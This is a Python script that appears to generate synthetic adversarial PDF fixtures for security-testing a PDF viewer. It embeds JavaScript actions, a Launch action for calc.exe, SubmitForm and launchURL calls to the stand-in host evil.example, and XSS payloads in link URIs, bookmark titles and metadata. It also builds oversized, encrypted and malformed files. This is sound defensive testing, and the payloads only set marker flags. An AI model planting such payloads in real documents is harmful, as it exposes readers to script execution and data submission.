"""Synthetic adversarial/edge-case PDFs for the PDF Book review. No real documents."""
import sys, zlib
from pathlib import Path
from pypdf import PdfWriter
from pypdf.generic import (DictionaryObject as D, NameObject as N, ArrayObject as A, FloatObject as F,
                           NumberObject as I, TextStringObject as T, DecodedStreamObject, StreamObject, BooleanObject)

OUT = Path(sys.argv[1]); OUT.mkdir(parents=True, exist_ok=True)

def font(w):
    return w._add_object(D({N('/Type'): N('/Font'), N('/Subtype'): N('/Type1'), N('/BaseFont'): N('/Helvetica'),
                            N('/Encoding'): N('/WinAnsiEncoding')}))

def page(w, f, text, size=(420, 594), extra=b''):
    p = w.add_blank_page(*size)
    p[N('/Resources')] = D({N('/Font'): D({N('/F1'): f})})
    s = DecodedStreamObject()
    s.set_data(b'0.9 0.95 0.9 rg 0 0 %d %d re f 0 0 0 rg BT /F1 18 Tf 20 %d Td (' % (size[0], size[1], max(10, size[1] - 40))
               + text.encode('cp1252') + b') Tj ET\n' + extra)
    p[N('/Contents')] = w._add_object(s)
    return p

def link(w, p, rect, action=None, dest=None):
    a = D({N('/Type'): N('/Annot'), N('/Subtype'): N('/Link'), N('/Rect'): A([F(x) for x in rect]), N('/Border'): A([I(0), I(0), I(1)])})
    if action is not None: a[N('/A')] = action
    if dest is not None: a[N('/Dest')] = dest
    ref = w._add_object(a)
    p.setdefault(N('/Annots'), A()).append(ref)
    return ref

def save(w, name):
    with (OUT / name).open('wb') as fh: w.write(fh)

# 1) Actions: OpenAction JS, link JS/Launch/SubmitForm/GoToR, AcroForm + XFA, AA on page
w = PdfWriter(); f = font(w)
p1 = page(w, f, 'Aktionen Seite 1 - äöü ß'); p2 = page(w, f, 'Aktionen Seite 2'); p3 = page(w, f, 'Aktionen Seite 3')
js = lambda code: D({N('/S'): N('/JavaScript'), N('/JS'): T(code)})
w._root_object[N('/OpenAction')] = js('globalThis.__OPENACTION__=1;app.alert("openaction")')
p1[N('/AA')] = D({N('/O'): js('globalThis.__PAGE_AA__=1')})
link(w, p1, [20, 400, 200, 430], js('globalThis.__LINKJS__=1;app.launchURL("https://evil.example/js-launch",true)'))
link(w, p1, [20, 350, 200, 380], D({N('/S'): N('/Launch'), N('/F'): T('C:\\Windows\\System32\\calc.exe')}))
link(w, p1, [20, 300, 200, 330], D({N('/S'): N('/SubmitForm'), N('/F'): D({N('/FS'): N('/URL'), N('/F'): T('https://evil.example/submit')})}))
link(w, p1, [20, 250, 200, 280], D({N('/S'): N('/GoToR'), N('/F'): T('other.pdf'), N('/D'): A([I(0), N('/Fit')])}))
link(w, p1, [20, 200, 200, 230], D({N('/S'): N('/URI'), N('/URI'): T('javascript:globalThis.__URIJS__=1')}))
link(w, p1, [20, 150, 200, 180], D({N('/S'): N('/URI'), N('/URI'): T('data:text/html,<script>parent.__DATA__=1</script>')}))
link(w, p1, [20, 100, 200, 130], D({N('/S'): N('/URI'), N('/URI'): T('https://safe.example/a?b="><img src=x onerror=globalThis.__ATTR__=1>')}))
link(w, p1, [220, 100, 400, 130], D({N('/S'): N('/Named'), N('/N'): N('/NextPage')}))
link(w, p1, [220, 150, 400, 180], None, A([p3.indirect_reference, N('/Fit')]))
link(w, p1, [220, 200, 400, 230], D({N('/S'): N('/GoTo'), N('/D'): T('kapitel3')}))
w._root_object[N('/Names')] = D({N('/Dests'): w._add_object(D({N('/Names'): A([T('kapitel3'), A([p3.indirect_reference, N('/Fit')])])}))})
field = w._add_object(D({N('/Type'): N('/Annot'), N('/Subtype'): N('/Widget'), N('/FT'): N('/Btn'), N('/Ff'): I(65536),
                         N('/T'): T('send'), N('/Rect'): A([F(220), F(400), F(400), F(430)]), N('/P'): p1.indirect_reference,
                         N('/A'): D({N('/S'): N('/SubmitForm'), N('/F'): D({N('/FS'): N('/URL'), N('/F'): T('https://evil.example/form')})}),
                         N('/AA'): D({N('/E'): js('globalThis.__FIELD_AA__=1')})}))
p1[N('/Annots')].append(field)
xfa = StreamObject(); xfa._data = b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template><script>globalThis.__XFA__=1</script></template></xdp:xdp>'
w._root_object[N('/AcroForm')] = D({N('/Fields'): A([field]), N('/XFA'): w._add_object(xfa), N('/NeedsRendering'): BooleanObject(True)})
w.add_js('globalThis.__DOCJS__=1;')
save(w, 'actions-ext.pdf')

# 2) Outline/title injection, many and deeply nested bookmarks
w = PdfWriter(); f = font(w)
pages = [page(w, f, f'Lesezeichen {i+1}') for i in range(6)]
evil = ['<img src=x onerror=globalThis.__OUTLINE__=1>', '</script><script>globalThis.__OUTLINE2__=1</script>', '"><svg onload=globalThis.__OUTLINE3__=1>', 'Umlaute äöü ß – € 漢字 \u202Eevil']
parent = None
for i, t in enumerate(evil): w.add_outline_item(t, i % 6)
deep = None
for d in range(12): deep = w.add_outline_item(f'Tiefe {d}', d % 6, parent=deep)
for i in range(600): w.add_outline_item(f'Eintrag {i}', i % 6)
w.add_outline_item('Ziel ungültig', 0).get_object()[N('/Dest')] = A([I(999), N('/Fit')])
w._root_object[N('/Info')] = w._add_object(D({N('/Title'): T('<script>globalThis.__INFO__=1</script>')}))
save(w, 'outline.pdf')

# 3) page-count/geometry edge cases
for count, name in [(2, 'two-page.pdf'), (1001, 'too-many.pdf'), (1000, 'thousand.pdf'), (4, 'four-page.pdf'), (8, 'eight.pdf')]:
    w = PdfWriter(); f = font(w)
    for i in range(count): page(w, f, f'Seite {i+1} von {count}', size=(200, 280) if count > 100 else (420, 594))
    save(w, name)
w = PdfWriter(); f = font(w)
page(w, f, 'schmal', size=(20, 14400)); page(w, f, 'breit', size=(14400, 20)); page(w, f, 'riesig', size=(14400, 14400)); page(w, f, 'normal')
p = page(w, f, 'gedreht 90'); p[N('/Rotate')] = I(90); link(w, p, [20, 20, 200, 60], D({N('/S'): N('/URI'), N('/URI'): T('https://rotated.example/')}))
p = page(w, f, 'quer + Doppelseite', size=(840, 594))
save(w, 'geometry.pdf')

# 4) many annotations
w = PdfWriter(); f = font(w); p = page(w, f, '2000 Links'); page(w, f, 'zwei')
for i in range(2000):
    x, y = (i % 40) * 10, (i // 40) * 10
    link(w, p, [x, y, x + 9, y + 9], D({N('/S'): N('/URI'), N('/URI'): T(f'https://many.example/{i}')}))
save(w, 'many-links.pdf')

# 5) big images (one under, one over maxImageSize 16 MP)
for side, name in [(3900, 'image-15mp.pdf'), (5000, 'image-25mp.pdf')]:
    w = PdfWriter(); f = font(w); p = page(w, f, f'Bild {side}px', extra=b'q 400 0 0 560 10 10 cm /Im1 Do Q')
    img = StreamObject(); img._data = zlib.compress(bytes([200, 120, 40]) * side * side, 9)
    img.update({N('/Type'): N('/XObject'), N('/Subtype'): N('/Image'), N('/Width'): I(side), N('/Height'): I(side),
                N('/ColorSpace'): N('/DeviceRGB'), N('/BitsPerComponent'): I(8), N('/Filter'): N('/FlateDecode')})
    p[N('/Resources')][N('/XObject')] = D({N('/Im1'): w._add_object(img)})
    save(w, name)

# 6) CJK non-embedded font -> needs packed CMap (bcmap) + fallback
w = PdfWriter()
cid = w._add_object(D({N('/Type'): N('/Font'), N('/Subtype'): N('/CIDFontType0'), N('/BaseFont'): N('/KozMinPr6N-Regular'),
                       N('/CIDSystemInfo'): D({N('/Registry'): T('Adobe'), N('/Ordering'): T('Japan1'), N('/Supplement'): I(6)}),
                       N('/FontDescriptor'): w._add_object(D({N('/Type'): N('/FontDescriptor'), N('/FontName'): N('/KozMinPr6N-Regular'), N('/Flags'): I(4),
                                                             N('/FontBBox'): A([I(0), I(-200), I(1000), I(900)]), N('/ItalicAngle'): I(0), N('/Ascent'): I(880),
                                                             N('/Descent'): I(-120), N('/CapHeight'): I(700), N('/StemV'): I(80)}))}))
t0 = w._add_object(D({N('/Type'): N('/Font'), N('/Subtype'): N('/Type0'), N('/BaseFont'): N('/KozMinPr6N-Regular'),
                      N('/Encoding'): N('/UniJIS-UCS2-H'), N('/DescendantFonts'): A([cid])}))
p = w.add_blank_page(420, 594); p[N('/Resources')] = D({N('/Font'): D({N('/F1'): t0})})
s = DecodedStreamObject(); s.set_data(b'BT /F1 36 Tf 40 400 Td <65e5672c8a9e> Tj ET'); p[N('/Contents')] = w._add_object(s)
save(w, 'cjk.pdf')

# 7) encrypted, truncated, fake header
w = PdfWriter(); f = font(w); page(w, f, 'geheim'); page(w, f, 'geheim 2'); w.encrypt(user_password='test', owner_password='owner', algorithm='RC4-128')
save(w, 'password.pdf')
w = PdfWriter(); f = font(w); page(w, f, 'nur Leserechte'); w.encrypt(user_password='', owner_password='owner', algorithm='RC4-128', permissions_flag=0)
save(w, 'owner-only.pdf')
good = (OUT / 'eight.pdf').read_bytes()
(OUT / 'truncated.pdf').write_bytes(good[: len(good) // 2])
(OUT / 'fake-header.pdf').write_bytes(b'%PDF-1.7\n' + bytes(range(256)) * 40)
(OUT / 'html-as.pdf').write_bytes(b'<html><body>%PDF- <script>alert(1)</script></body></html>')
(OUT / 'empty.pdf').write_bytes(b'')
print('fixtures written to', OUT)
